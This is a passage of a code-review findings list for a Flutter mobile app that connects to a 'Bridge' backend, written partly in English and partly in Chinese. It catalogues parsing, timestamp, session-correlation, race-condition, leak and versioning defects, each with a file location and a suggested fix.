  request_user_input returns const [] on any invalid question item (its documented behavior), and side_chat turns the length mismatch into FormatException dropping the whole side_chat_event; a non-String description or multiSelect:"true" means the user never receives the question while Bridge waits, permanently stalling the side session. Fix: skip bad items; worst case render an unparseable placeholder allowing abort.
- **[compat]** `apps/mobile/lib/models/local_features/slots/side_chat_protocol_slot.dart:487` — Optional string fields throw on empty string, a common TS default
  if (value is! String || value.trim().isEmpty) throw rejects the extremely common field ?? '' TS default; same defect at codex_desktop_continuity:171-178 and auto_approval:220-231. Fix: normalize empty string to null.
- **[logic]** `apps/mobile/lib/models/local_features/slots/subagents_models_slot.dart:80` — Timestamp triple fault: sec/ms guess, ArgumentError frame drop, UTC/local mix
  abs()<1e11 guesses units (microseconds -> year 50000); DateTime.fromMillisecondsSinceEpoch throws ArgumentError for |ms|>8.64e15 dropping the whole message; numeric path emits Z-suffixed UTC while string path passes naive strings later parsed as local — 'n minutes ago' skews by a timezone. Fix: DateTime? field with unified toUtc(), range guard returning null.
- `E06` **[bug]** `apps/mobile/lib/models/local_features/slots/subagents_models_slot.dart:82` — _subagentDateString lacks isFinite check and RangeError catch
  Its session_insights twin has both guards; NaN/Infinity throws UnsupportedError and huge epoch values RangeError → whole subagent list frame lost. session_insights_models_slot._sessionInsightsIntOrNull is also missing isFinite while its protocol-slot twin has it.
- **[bug]** `apps/mobile/lib/models/local_features/slots/subagents_models_slot.dart:94` — _subagentNonEmptyString blindly toString()s any type into UI strings
  Maps/lists/numbers become literal strings like "{code: 5}" rendered to UI, and sessionId: 12345 becomes "12345" participating in correlation checks (mismatch/miss). The opposite extreme of the strict numeric validators in the same directory. Fix: accept String only (optionally num), return null for Map/List.
- **[bug]** `apps/mobile/lib/models/local_features/slots/subagents_protocol_slot.dart:132` — Bare as List? casts on subagents/messages drop the whole message
  (rawSubagents as List?) and (json['messages'] as List?) throw TypeError when the backend sends {} (common in TS for empty) or a string. Fix: raw is List ? raw : const [].
- `E10` **[bug]** `apps/mobile/lib/models/machine.dart:29` — Prerelease/build version components parsed as 0 → false update prompt
  Only -compat.N is stripped; '1.67.4-rc.1' parses '4-rc' as 0 so the version is treated as 1.67.0 and the app wrongly prompts 'update your Bridge'; '+build' metadata same.
- `B06` **[bug]** `apps/mobile/lib/models/machine.g.dart:38` — lastConnected round-trip drops offset; DateTime== isUtc causes false diffs
  toIso8601String() omits the offset for local DateTimes so the persisted value is reinterpreted after a timezone change; Dart DateTime== also compares isUtc, giving the freezed Machine== spurious inequality and needless rebuilds.
- `G-3/G04` **[logic]** `apps/mobile/lib/models/messages.dart:1` — 5922-line hand-written protocol layer with no shared parsing helpers
  Zero Freezed/json_serializable against project convention; the same semantic field is parsed 20+ different ways enabling the whole A/E defect class. Minimum fix: shared _str/_strOr/_intOr/_stringListOf primitives banning bare `as`.
- `F06` **[compat]** `apps/mobile/lib/models/messages.dart:143` — Silent-masquerade enum fallbacks (aggregate of 8)
  CodexThreadGoalStatus→active; SessionLinkResolutionStatus→unavailable; delivery-mode binarize→interactive; permissionsMode→custom; deriveExecutionMode hardcoded 'never'; on-failure→on-request save drift; sanitizeCodexModelName 'codex' magic string; desktop-continuity unknown fallback negated by validate throw.
- `F5` **[logic]** `apps/mobile/lib/models/messages.dart:233` — sanitizeCodexModelName treats literal 'codex' as unset
  Hardcoded magic string with no source comment; if Codex uses 'codex' to mean follow-profile, the model silently shows empty and may be omitted on next start.
- `F1` **[compat]** `apps/mobile/lib/models/messages.dart:381` — Unknown codexPermissionsMode collapses to custom; save overwrites real mode
  A future readOnly/planOnly mode displays as 'Custom (config.toml)' and toggling in UI overwrites it with custom semantics. Keep the raw string and echo unknown values read-only.
- `F-5/F2` **[logic]** `apps/mobile/lib/models/messages.dart:450` — deriveExecutionMode hardcodes 'never' literal and silently defaults unknowns
  Line 467 uses a bare 'never' literal though CodexApprovalPolicy.never.value exists (used at 365); unknown permissionMode silently maps to defaultMode so UI shows Default while actual permissions are unknown.
- `F-6` **[bug]** `apps/mobile/lib/models/messages.dart:539` — ReasoningEffort.fromValue instances outside values can crash dropdowns
  A wire value like 'ultra-max' produces an instance not in ReasoningEffort.values; feeding it as DropdownButton value with items built from values trips Flutter's 'exactly one item' assertion.
- `E-1/E05` **[bug]** `apps/mobile/lib/models/messages.dart:690` — Systemic `as int?` vs JSON doubles; three integer-parse styles in one file
  Problem sites 690, 1105-1109, 1150-1151, 1176-1177, 1187-1188, 1203, 1443, 1523-1524, 1647-1653, 2339, 2352, 3229, 3864, 3925, 3949, 4071-4073, 4200, 4280; correct (num?)?.toInt() style already coexists, plus a third style in conversation_mirror slot.
- **[perf]** `apps/mobile/lib/models/messages.dart:695` — QueuedInputItem lacks ==/hashCode; every conversation_queue rebuilds chat page
  ChatSessionState is freezed and compares queuedInput via ==, but QueuedInputItem has no value equality, so each conversation_queue message produces a never-equal state and forces a full chat page rebuild (CodexGoal has == and does not, proving the contrast).
- **[bug]** `apps/mobile/lib/models/messages.dart:737` — UsageWindow parses utilization/resetsAt/provider as non-null casts
  (json['utilization'] as num).toDouble(), resetsAt as String, provider as String all throw on null/missing while the neighboring session_insights slot already uses the hardened as num?)?.toDouble() ?? 0 form. One missing field drops the message.
- `G-5` **[bug]** `apps/mobile/lib/models/messages.dart:779` — _normalizeToolResultContent silently drops non-text blocks
  image/document/future json blocks vanish so users see 'empty tool result'; whereType<Map<String,dynamic>> (not whereType<Map>) can filter every Map<dynamic,dynamic> to an empty string.
- `F-1` **[bug]** `apps/mobile/lib/models/messages.dart:925` — Timestamps without timezone designator parsed as local time
  DateTime.tryParse returns a local DateTime for ISO strings without Z/offset, and chat_message_handler then calls .toLocal() which is a no-op on already-local values. If the Bridge sends naive UTC strings, chat times shift by the whole timezone offset.
- `A-8` **[bug]** `apps/mobile/lib/models/messages.dart:1008` — Three string-list parse styles coexist; skills/slashCommands throw on one null
  `.map((e) => e as String)` (throws), `.whereType<String>()` (skips) and `.cast<String>()` (deferred throw) are all used. One null element in skills/slashCommands/apps kills the whole system init frame while the adjacent plugins field tolerates it.
- `A22` **[bug]** `apps/mobile/lib/models/messages.dart:1011` — Three string-list parse styles coexist (dup)
  skills throw on one null element (kills system init frame) while adjacent plugins skip; cast<String> deferred-throws.
- `A-7/A24` **[bug]** `apps/mobile/lib/models/messages.dart:1061` — ~14 single-frame bare casts across assistant/permission/file/diff messages
  assistant.message, toolUseId, session_link ids, permission input, file_content filePath, diff_image, worktreePath, tool_use_summary, debug session, AssistantContent fields, CodexGoal fields — each malformed field discards its frame with a Parse error bubble (R1).
- **[bug]** `apps/mobile/lib/models/messages.dart:1078` — Remaining .map((e) => e as String) sites throw on one non-string element
  The report cites :1008,1012,1022,1237,1240,1251,1271; the session_list portion is already fixed this session (P0-8 per-entry tolerance + droppedSessionCount) but bare .map((e) => e as String) still remains for skills/apps lists in the system-init parse (current lines ~1074-1088), where one bad element drops the whole message. Not fully subsumed by P0-8.
- `F-3` **[compat]** `apps/mobile/lib/models/messages.dart:1838` — BridgeClientDeliveryMode.fromWire binarizes unknown modes to interactive
  Future silent/paused delivery modes are treated as interactive, so the client keeps demanding full streaming against the Bridge's throttling/battery-saving intent.
- `C-2/C06` **[logic]** `apps/mobile/lib/models/messages.dart:2016` — artifactMessageId lacks provider/session/bridge dimensions
  msg_xxx repeats when history is replayed into forked/linked/restored sessions; opening session A's attachment can resolve session B's artifact. Sibling messages do carry provider — inconsistent.
- `A-12` **[logic]** `apps/mobile/lib/models/messages.dart:2021` — Gap declares up to 200 toolUseIds but responses parse max 8 — gaps never fill
  maxToolUseIds=200 vs call-site .take(8), applied before the isValid filter (so invalid items consume the 8 budget); protocol limits mismatch means large gaps can never complete. Over-128-char gapId silently becomes '' and the whole gap is dropped without trace.
- `P0-14` **[compat]** `apps/mobile/lib/models/messages.dart:2213` — Guardian 'timedOut' 用 camelCase，其余 wire 值是 snake_case
  fromString 中 'timedOut' 与其他 snake_case wire 值风格不一致，极可能本身就是一个已存在的、与 Bridge 侧不匹配的字面量。若 Bridge 实际发送 'timed_out'，该分支永不命中，超时状态会落到兜底分支。需与 Bridge 侧对齐确认。
- `A-10` **[bug]** `apps/mobile/lib/models/messages.dart:2240` — GuardianApprovalMessage risk/status bare casts + shallow action copy
  risk/status as String? throw if Bridge sends object forms; action Map.from shallow copy leaves nested Map<dynamic,dynamic>. The rawAction is Map check shows the correct pattern was known but not applied to sibling fields.
- `A-11` **[bug]** `apps/mobile/lib/models/messages.dart:2339` — fromSeq/seq/counts/windowId use `as int?` which throws on JSON doubles
  Node/TS numbers passing through division or Math.* serialize as 1.0/1e3; Dart jsonDecode yields double and as int? throws instead of converting. Sites: 2339, 2352, 3864, 3925, 3949, 3229.
- `C-3` **[logic]** `apps/mobile/lib/models/messages.dart:2397` — Tool-detail cache keyed by bare toolUseId without session dimension
  History replay, archive restore, or two Bridges sharing a rollout produce same-id details; a global Map<String,HistoryToolDetail> cache cross-contaminates sessions. gapId (2023) likewise lacks a session dimension.
- `D-2/D06` **[logic]** `apps/mobile/lib/models/messages.dart:2769` — grantRoot and change paths shown verbatim, not co-normalized
  With ~/proj as root and absolute file paths as changes, users cannot visually verify files fall inside the granted root — a usability gap on the privilege-escalation surface.
- `E09` **[bug]** `apps/mobile/lib/models/messages.dart:2817` — _flattenPermissionValues unbounded recursion/output (dup)
  Uncatchable StackOverflow kills the isolate; multi-MB join hangs UI; triggerable by a hostile MCP server.
- `D05` **[logic]** `apps/mobile/lib/models/messages.dart:2903` — _changePaths approval count inflation (dup)
  No dedupe/normalization: 'Allow changes to 4 files' shown for 1 actual file — misleading security approval copy.
- `A-9` **[bug]** `apps/mobile/lib/models/messages.dart:3336` — DebugReproRecipe bare Map casts (its notes cast<String> was fixed by P0-7)
  Three as Map<String,dynamic>? casts throw if fields become lists; the notes cast<String>() at 3349 was already converted this session under P0-7, but the map casts remain.
- `D-3` **[logic]** `apps/mobile/lib/models/messages.dart:3398` — Path fields are raw strings used as keys; relativeUrl encoding undefined
  prompt_history matchesFilters does exact string compare of projectPath (breaks on trailing slash or realpath variants like /System/Volumes/Data prefix); ArtifactResolvedMessage.relativeUrl has no percent-encoding contract so double-encoding is likely for names with spaces/#/CJK.
- `C-4` **[logic]** `apps/mobile/lib/models/messages.dart:3669` — Several result messages carry only sessionId with no provider/bridge
  RenameResult/BranchUpdate/RecordingContent/DebugBundle/SessionLifecycleResult lack provider while SessionLinkResolution/ArchiveResult/RecentSessions have it; Claude/Codex uuid namespaces can collide and route results to the wrong session undetectably. ArchivedSessionRecord lacks bridgeInstanceId so two machines' archives overwrite each other.
- `C09/C3` **[logic]** `apps/mobile/lib/models/messages.dart:4010` — MessageImagesResultMessage carries only messageUuid
  The request sends claudeSessionId but the response drops it; concurrent requests or forked histories with the same uuid mix images across sessions.
- `C07/C2` **[logic]** `apps/mobile/lib/models/messages.dart:4021` — All Git result messages except status lack projectPath/requestId
  Stage/Unstage/Commit/Push/Branches/Checkout/Revert/Fetch/Pull/RemoteStatus carry no correlation dims and git_view_cubit/branch_cubit subscribe unfiltered — with two projects' Git panels open, results cross-write into the wrong panel.
- `A6` **[bug]** `apps/mobile/lib/models/messages.dart:4071` — ahead/behind/sizeBytes/imageCount `as int?` throw on JSON 1.0
  TS numbers passing through division serialize as 1.0; git_branches_result frame is lost (branch panel blank). ArtifactRef uses correct (num?)?.toInt() — two styles in one file. Also 4200, 4280.
- `B1` **[bug]** `apps/mobile/lib/models/messages.dart:4229` — modifiedDate: no-Z strings parse as local, Z strings as UTC
  Mixed formats in one list mis-sort/display by up to ±14h; normalize with explicit UTC policy for offset-less strings.
- `D-1/D02/D1` **[logic]** `apps/mobile/lib/models/messages.dart:4307` — Seven mutually incompatible path-normalization strategies coexist
  pathBasename, tool_categories (trailing slash → empty string), file_browser (bans \\ and dot segments), artifact_link_matcher (two variants), offline_pending_action, and raw != compares in projection. None handle ~, trailing slash, macOS case-fold or NFC/NFD (APFS returns NFD); projectPath keys in 5 Sets split projects and file_browser case-sensitive keys silently drop responses. Fix: one canonicalProjectPath used by all comparisons and keys.
- `C1/G1` **[logic]** `apps/mobile/lib/models/messages.dart:4315` — RecentSession lacks bridgeInstanceId; three key schemes with three dims
  _recentIdentity uses provider+sessionId only, pin keys add projectPath, cache partitions by bridge hash. Two Bridges (or synced ~/.claude/projects) with the same sessionId merge into one row and the other silently disappears. bridgeInstanceId is parsed at 1235 but not propagated to entries.
- `A7` **[bug]** `apps/mobile/lib/models/messages.dart:4400` — codexSettings bare Map cast in RecentSession and SessionInfo
  Array/string-shaped settings throw TypeError; recent_sessions frame still dies wholesale (session_list side now entry-scoped after P0-8). Guard with `is Map` check.
- `D2` **[logic]** `apps/mobile/lib/models/messages.dart:4415` — projectPath used verbatim as Set/Map keys across session_list state
  Five Set<String> collections plus pin keys use the raw string; a trailing-slash variant from a different Bridge code path splits one project into two groups and breaks pin/collapse state.
- `G02/G2` **[logic]** `apps/mobile/lib/models/messages.dart:4450` — toJson persists derived executionMode/approvalPolicy as authoritative
  Derived values written to the sqflite cache take the explicit branch on reload, so the derivation logic never re-runs; after an app upgrade changes the rules, stale frozen conclusions persist forever (cache never invalidated by version).
- `G03` **[perf]** `apps/mobile/lib/models/messages.dart:4572` — 30+ classes missing ==/hashCode incl. @immutable ComposerToken (dup)
  Also DiffLine/DiffHunk/DiffFile/DiffImageData and ConversationContentTarget (has key getter but no ==); ComposerToken is @immutable without == while sibling classes in the same file implement it.
- `B3` **[logic]** `apps/mobile/lib/models/messages.dart:4585` — lastActivityAt carries two formats across its lifetime
  Initially the Bridge's raw string, then _patchSessionActivity rewrites it as forced-Z UTC ISO; any string comparison behaves differently pre/post patch. Normalize in fromJson.
- **[bug]** `apps/mobile/lib/models/messages.dart:4673` — SessionInfo.copyWith cannot reset nullable fields back to null
  Only 5 fields have clearXxx flags; codexModel/codexProfile/codexServiceTier/codexSandboxMode/codexApprovalsReviewer/model use x ?? this.x, so copyWith(codexServiceTier: null) is a no-op and stale values persist in UI (bridge_service.dart:4725 uses this path). Fix: sentinel-based copyWith or freezed.
- `A8` **[bug]** `apps/mobile/lib/models/messages.dart:4812` — Capability flags parsed with `as bool?` — type narrowing throws
  If a capability bit evolves to tri-state string or 0/1, TypeError drops the entry/frame; needs a tolerant _asBool(dynamic) accepting bool/0-1/'true'.
- `B4` **[logic]** `apps/mobile/lib/models/messages.dart:5871` — ServerChatEntry .toLocal() conflicts with projection's .toUtc()
  For naive strings the two strategies diverge by the tz offset, so chat bubble times disagree with session card times. Standard: parse to UTC, toLocal only at render.
- **[logic]** `apps/mobile/lib/models/messages.dart:5887` — Mutable public ChatEntry fields + identity equality risk dropped state emits
  UserChatEntry.status/messageUuid and StreamingChatEntry.text are mutable public fields while entries compare by identity in freezed DeepCollectionEquality; if code ever mutates entry.status in place and re-emits the same list, bloc judges states equal and drops the emit, freezing UI at 'sending'. Currently no in-place writes found (latent hazard). Fix: make fields final + copyWith.
- **[bug]** `apps/mobile/lib/providers/machine_manager_cubit.dart:116` — waitUntilLoaded catches only TimeoutException; StateError on close escapes
  If the Cubit closes while waiting, the stream ends and firstWhere throws StateError('No element'), which escapes to the auto-connect caller (session_list_screen.dart:178) with no fallback. Fix: catch-all or orElse: () => state.
- `B-5` **[logic]** `apps/mobile/lib/providers/machine_manager_cubit.dart:299` — startBridge/updateBridge/refresh have no single-flight; single-value ids clash
  Double-tapping start launches two SSH sessions and the first return clears startingMachineId early; starting machines A and B concurrently lets B's completion erase A's progress indicator; concurrent version refreshes let the slower response overwrite the faster (no generation fence). Fix: per-machineId in-flight map or Set<String>, and a version request id.
- `A-10` **[leak]** `apps/mobile/lib/providers/machine_manager_cubit.dart:609` — close() does not stop the periodic health check it started
  startPeriodicHealthCheck is launched by the cubit but close() only cancels _machinesSub, so MachineManagerService._healthCheckTimer keeps probing all machines every 30s (compounding the A-1 tunnel leak). _machinesSub?.cancel() is also not awaited.
- **[leak]** `apps/mobile/lib/providers/server_discovery_cubit.dart:11` — Fire-and-forget startDiscovery races dispose; native mDNS browser never stopped
  If close() runs before await impl.startDiscovery(...) returns, stopDiscovery() sees _discovery==null and does nothing; the in-flight start then assigns _discovery and the native mDNS browser is never stopped (native resource leak + battery drain). Fix: retain the start Future and await it in an async dispose.
- **[bug]** `apps/mobile/lib/providers/stream_cubit.dart` — StreamCubit: listen(emit) without isClosed guard; close() cancels without await
  stream.listen(emit) is unguarded and _sub?.cancel() is not awaited before super.close(). Safe today for broadcast controller sources but emit-after-close is possible for async-transformed streams (asyncMap etc.); the pattern is reused by 6 cubit typedefs and inconsistent with UnseenSessionsCubit's guards.
- **[bug]** `apps/mobile/lib/providers/stream_cubit.dart:10` — StreamCubit lacks onError, isClosed guard, and awaited cancel
  Reused by 6 top-level providers; any future _xxxController.addError becomes a global unhandled error crash instead of a visible error state, and unawaited cancel means transformed streams (asyncMap) can deliver events after super.close() causing StateError. Fix: guarded listen with onError logging and await cancel.
- `C-1` **[logic]** `apps/mobile/lib/providers/unseen_sessions_cubit.dart:17` — Unread-state persistence key lacks the Bridge dimension; cross-machine mixing
  _stableKey falls back to session.id, a Bridge-local runtime id that can collide across machines, under a single global prefs key. In multi-Bridge setups machine A's session can be marked read by machine B's identically-keyed session, contradicting the class's own doc comment.
- `E-5` **[perf]** `apps/mobile/lib/providers/unseen_sessions_cubit.dart:74` — Every persistence change jsonEncodes up to 1000 entries on the main isolate
  _scheduleSave runs jsonEncode(Map.of(_seenAt)) in full on each persistenceChanged; with frequent session-list pushes this fires repeatedly. Debounce plus incremental writes are suggested.
- `E4` **[bug]** `apps/mobile/lib/router/app_router.dart:46` — Mock preview and mock data compiled into release and reachable
  MockPreviewRoute is registered unconditionally and mock_preview_screen.dart is unconditionally imported, defeating tree-shaking of ~12,000 lines of mock code, and the screen is reachable in release via the 5-tap debug entry (B4). The kDebugMode guards only cover Marionette extension registration, not linkage or UI reachability; register the route conditionally and move lib/mock out of the main import graph.
- `E2` **[bug]** `apps/mobile/lib/router/app_router.gr.dart:119` — Stale generated router: durableProviderSessionId missing from 2 RouteArgs
  ClaudeSessionRouteArgs and CodexSessionRouteArgs lack the durableProviderSessionId parameter present on the screens' constructors (grep in .gr.dart: 0 hits), so navigation via those routes always passes null and all durable-id branches in both session screens take the null path. Re-run build_runner and add a CI git diff --exit-code check for generated files.
- `E3` **[bug]** `apps/mobile/lib/router/session_route_observer.dart:68` — Dynamic sessionId extraction plus workspace layout permanently clears active session
  _extractSessionId uses a dynamic call with a bare catch, so any Args field rename silently degrades to 'no active session'. In workspace layouts sessions are embedded widgets registered via selectSession, but pushing then popping SettingsRoute makes the observer clearActiveSession twice with nothing re-registering it, so the session the user is viewing keeps receiving push notifications (do-not-disturb for current session breaks).
- `B-11` **[bug]** `apps/mobile/lib/services/app_icon_service.dart:66` — sync() has no single-flight; duplicate setIcon calls and stale state writes
  Concurrent calls both read _lastAppliedIcon == null and each run getCurrentIcon() + setIcon(). iOS setAlternateIconName shows a system dialog, so duplicates are user-visible, and the late setIcon writes a stale value into _lastAppliedIcon.
- `B-12` **[logic]** `apps/mobile/lib/services/app_update_service.dart:140` — Update-check throttle condition inverted; no-update case bypasses throttle entirely
  The early return requires _cachedUpdate != null, but most users have no update (_cachedUpdate == null) so the 1-hour throttle never applies and every call hits the GitHub API (60/h unauthenticated limit). checkForUpdate also lacks single-flight.
- `B7` **[logic]** `apps/mobile/lib/services/app_update_service.dart:164` — macOS update banner shows GitHub version but installs the Sparkle appcast version
  When Sparkle probes no update but canUseNativeUpdater() is true, AppUpdateInfo is built from GitHub Releases yet installMode is nativeUpdater, so performUpdate runs Sparkle and installs whatever the appcast has. If the appcast lags GitHub, the user sees 'v1.110.0 available', clicks update, and gets v1.109.x with no notice.
- `E-6` **[perf]** `apps/mobile/lib/services/app_update_service.dart:298` — GitHub releases?per_page=20 response jsonDecoded on the main isolate
  Twenty releases with all assets can be hundreds of KB decoded synchronously on the main isolate; use compute() or the releases/latest endpoint.
- `B6` **[bug]** `apps/mobile/lib/services/app_update_service.dart:347` — Version comparison turns non-numeric segments into 0; prerelease handling wrong
  _isNewer maps each dot segment via int.tryParse ?? 0, so 1.3.0-rc1 becomes 1.3.0 and is judged newer than 1.2.9 contrary to semver prerelease rules, and only 3 segments are compared with +build ignored. machine.dart's _semanticVersionCore only special-cases the fork's -compat.N suffix; use pub_semver or reject unparseable versions.
- `H-2` **[logic]** `apps/mobile/lib/services/bridge_service.dart:316` — history pending maps 以 sessionId 为键、latest-writer-wins 覆盖 fallback 策略
  `_pendingHistoryDeltaAllowsFullFallback[sessionId] = allowFullFallback` 并注明 "The latest caller owns the fallback policy"。前台请求（fallback=true）可被随后的后台 delta-only 请求覆盖，前台因此拿不到全量回退，历史缺失。应按 (sessionId, requestId) 关联并对策略取 OR。
- `3.2-C` **[perf]** `apps/mobile/lib/services/bridge_service.dart:1842` — unscoped unsupported_message 错误触发全部 pending session 同时全量拉取（雪崩）
  bridge_service.dart:1842-1845, 2215-2231：旧 Bridge 的 unscoped unsupported_message 会一次性对所有 pending session 调用 _fallbackPendingHistoryDeltaRequests()（sessionIds = List.from(keys); clear(); 遍历全部 session 各自发 getHistory）。一条错误驱动 N 个会话同时全量重拉，是"重复两次"的候选机制之一。
- `A10` **[compat]** `apps/mobile/lib/services/bridge_service.dart:2747` — _isPersistableOfflineMessage hardcoded 6-type whitelist silently drops types
  Future message types that should persist offline are silently discarded with no log, opposite to the growing ClientMessage factory surface (archive/goal etc.); should key off delivery==queued once raw() stops dropping delivery.
- `C-5` **[logic]** `apps/mobile/lib/services/bridge_service.dart:3288` — 全局 loadMore 的 offset 复用被 project 合并撑大的 _recentSessions.length，静默丢行
  offset: offset ?? _recentSessions.length，而 _recentSessions 会被 project 页合并（:1609-1613）与 catalog 前缀替换（:1614-1622）撑大。先展开某项目组加载 20 条再触发全局 loadMore，offset 会跳过全局排序中从未加载的区段。
- `C-6` **[logic]** `apps/mobile/lib/services/bridge_service.dart:3292` — offset 分页无 snapshot token/revision pin，两页之间目录变化即重复/丢行
  响应虽回显 catalogRevision，但请求不 pin revision。可变目录在两次分页之间插入/删除/归档时会产生重复项或漏项。需 snapshot revision + opaque cursor，旧 Bridge 回退需串行化 + stable-key 去重。
- `C-1` **[logic]** `apps/mobile/lib/services/bridge_service.dart:3540` — _lastSessionCatalogRevision 同目标自动重连不清零，目录实时刷新静默失效
  该值仅在 bridge 切换或主动 disconnect 时归零。网络闪断且 Bridge 进程已重启（同 URL）时新进程 revision 从小值重新计数 → `if (revision <= _lastSessionCatalogRevision) return` 把所有 session_catalog_changed 当旧事件丢弃。
- `H-3` **[logic]** `apps/mobile/lib/services/bridge_service.dart:4846` — messagesForSession 把无 sessionId 的消息广播给所有 chat cubit
  `.where((pair) => pair.$2 == null || pair.$2 == sessionId)` 使 error、status 等无标签消息进入每一个会话，造成跨会话串扰（例如一个会话的错误在所有会话上弹出）。
- `D-7` **[bug]** `apps/mobile/lib/services/chat_message_handler.dart:1036` — 'stopped' result does not clear currentThinkingText; thinking bleeds into next turn
  The isStopped branch clears currentStreaming but not currentThinkingText, so thinking deltas accumulated before a user interrupt are injected by _handleAssistant into the first assistant message of the next turn, displayed as reasoning for the new question.
- `M-1/M-9` **[logic]** `apps/mobile/lib/services/conversation_mirror_service.dart:557` — 删除旧 Bridge 副本会误杀当前 Bridge 的活动 watch
  _cancelTargetRequests(key) 按 provider + providerSessionId 匹配 pending（:584-590），watch 查找用 bridge 无关的 _logicalWatchKey（:578-583），均不比对 bridgeInstanceId，随后向 Bridge 发 unwatch → 当前会话实时镜像 patch 停止，直到下次 reconcile 才恢复。新增测试只覆盖了"当前 Bridge 无活动 watch"路径。
- `M-2` **[perf]** `apps/mobile/lib/services/conversation_mirror_store.dart:978` — 每条删除触发一次无页数上限的 PRAGMA incremental_vacuum，阻塞串行存储队列
  一次性回收整个 freelist 且运行在服务的串行存储队列内。连续删除多个大副本（每个可达 64 MB）时阻塞后续镜像 patch 写入与其他删除，UI 表现为后续行 spinner 长转。
- `C-3` **[bug]** `apps/mobile/lib/services/database_service.dart:36` — No onDowngrade: version rollback bricks the DB silently and permanently
  sqflite's default onDowngrade throws; after a TestFlight/Shorebird rollback _initDatabase throws, the getter logs a warning and sets _initialized=true with _database=null, so Prompt History silently dies for the whole run with no retry or user notice. Same applies to a corrupted DB file. (Also listed as D-1: init failure downgraded to a warning with no retry/self-heal/UI feedback.)
- `C-2` **[logic]** `apps/mobile/lib/services/desktop_continuity_backlog.dart:108` — take() matches on threadId only, ignoring the recorded bridgeInstanceId
  _PendingSession stores bridgeInstanceId but take() never checks it, so after switching Bridge instances an old Bridge's backlog can be replayed into a new session if sessionId+threadId happen to match.
- `D-7` **[leak]** `apps/mobile/lib/services/draft_service.dart:13` — _imageCache holds decoded draft bytes for all sessions with no eviction
  The cache retains decoded image bytes for every session and only explicit delete removes entries, so long-lived use grows memory without bound.
- `B-10` **[bug]** `apps/mobile/lib/services/draft_service.dart:48` — All SharedPreferences draft writes are fire-and-forget with no ordering
  saveDraft/migrateDraft discard the returned Futures, so write failures are unobserved uncaught async errors and migrateDraft's write-new + delete-old pair has no transactionality; a crash mid-way can leave both or neither present.
- `B-9` **[bug]** `apps/mobile/lib/services/fcm_service.dart:37` — Concurrent init() makes getToken() wrongly return null
  _initAttempted is set immediately but _available only after success, so a second concurrent init() returns _available while still false and getToken() returns null even though initialization will succeed. Memoize a Future<bool>.
- `A-8` **[leak]** `apps/mobile/lib/services/in_app_review_service.dart:80` — dispose() does not unbind bridge.onOutgoingMessage
  attachToBridge sets bridge.onOutgoingMessage = recordOutgoingMessage but dispose only cancels stream subscriptions. The app-lifetime BridgeService keeps calling into the disposed service and writing prefs, and since the field is single-slot any other consumer assignment silently kills review telemetry.
- `D-3` **[bug]** `apps/mobile/lib/services/in_app_review_service.dart:158` — Review cooldown written before requestReview; its exception escapes unawaited
  The 90-day cooldown keys are persisted before _gateway.requestReview(), so a throwing gateway wastes the cooldown without showing the prompt. The exception then propagates through maybeRequestReview into an unawaited() call, becoming an unhandled async error.
- `B-7` **[bug]** `apps/mobile/lib/services/in_app_review_service.dart:240` — _increment read-modify-write loses counts under concurrency
  getInt then setInt(current+1) is called via unawaited() at three sites, so multiple events for the same key in a short window read the same current value and increments are lost.
- `C-6` **[bug]** `apps/mobile/lib/services/machine_manager_service.dart:100` — Machine-list migration drops the entire batch if any entry has a wrong type
  Bare casts like old['host'] as String and old['port'] as int throw on null/double/String data, and the surrounding catch just logs, silently losing the whole legacy machine list (credentials remain orphaned in the keychain). The URL-history branch has the same flaw; per-entry try/catch with skip is needed.
- `A-11` **[bug]** `apps/mobile/lib/services/machine_manager_service.dart:352` — In-flight checkHealth adds to closed controller after dispose
  dispose() closes _machinesController without cancelling in-flight HTTP probes, and each checkHealth unconditionally calls _notifyListeners at the end, throwing StateError: Cannot add event after closing. ServerDiscoveryService._emit already guards isClosed; this file does not.
- `B-4/E-4` **[bug]** `apps/mobile/lib/services/machine_manager_service.dart:657` — checkAllHealth has no reentrancy guard or generation fence; ghost cache entries
  The 30s Timer.periodic does not wait for the prior round, and after deleteMachine an in-flight checkHealth writes the deleted id back into _statusCache/_lastChecked/_lastErrors/_versionCache, creating never-collected ghost entries.
- `A-9` **[leak]** `apps/mobile/lib/services/native_paste_bridge.dart:15` — Static singleton holds owner State indefinitely; no activation stack
  _activeTarget stores (owner, handler); an owner destroyed without calling deactivate leaks its State permanently. With A then B activated, B's deactivate nulls the target and disables paste, silently destroying A's paste capability with no stack-based restore.
- `B-13` **[bug]** `apps/mobile/lib/services/notification_action_host.dart:73` — Unbuffered broadcast stream drops cold-start notification actions
  _actions is a plain broadcast stream; initialize() calls setDartReady early and native may immediately deliver queued approvalActions before NotificationApprovalCoordinator subscribes, so the user's tap on Allow in a notification does nothing. NotificationService solves this with _pendingLaunchResponse; this path does not buffer.
- `B-8` **[bug]** `apps/mobile/lib/services/notification_service.dart:73` — init() not reentrant; concurrent calls double-initialize the plugin
  _initialized is set after several awaits, and both permissionStatus() and requestPermission() await init(). Concurrent entry runs _plugin.initialize and createNotificationChannel twice, with the second overwriting the onDidReceiveNotificationResponse callback; memoize the init Future.
- `A-6` **[compat]** `apps/mobile/lib/services/notification_service.dart:316` — Android notifications declare no Allow/Reject actions; capability iOS-only
  AndroidNotificationDetails has no actions and the notificationApprovalActions capability is only declared in the iOS MobileHostSnapshotPlugin, so the long-press Allow/Reject product feature does not exist on Android and there is no degradation hint anywhere.
- `B-1/C-4` **[logic]** `apps/mobile/lib/services/prompt_history_service.dart:19` — ISO timestamps compared as strings; format differences invert ordering
  _maxIso uses left.compareTo(right), which is wrong when formats differ: '2026-07-26T10:00:00.000Z' vs '...T10:00:00Z' or '+00:00' offsets compare opposite to real time ('.' < 'Z', '+' < 'Z'), letting stale values overwrite last_used_at/favorite times. UnseenSessionsCubit._isAfter and _pruneSeenAt (unseen_sessions_cubit.dart:205-217) share the bug; parse to UTC DateTime instead.
- `C-5` **[logic]** `apps/mobile/lib/services/prompt_history_service.dart:1047` — Sync does delete-all + insert, wiping locally accumulated unsynced use counts
  The batch deletes all rows for the bridge id and aliases then inserts the Bridge snapshot. If the Bridge has not yet processed the corresponding record_prompt_history messages, locally incremented total_use_count/client_stats_json/session_stats_json are overwritten by the stale snapshot; per-entry merge by updated_at is needed.
- `A-12` **[bug]** `apps/mobile/lib/services/revenuecat_service.dart:557` — dispose/initialize race re-registers listener and writes disposed ValueNotifier
  dispose removes the customer info listener and disposes supporterState, but an _initialize still parked on an await later re-runs addCustomerInfoUpdateListener. Subsequent callbacks reach _updateState which writes the disposed ValueNotifier, throwing FlutterError; a _disposed flag double-check is needed.
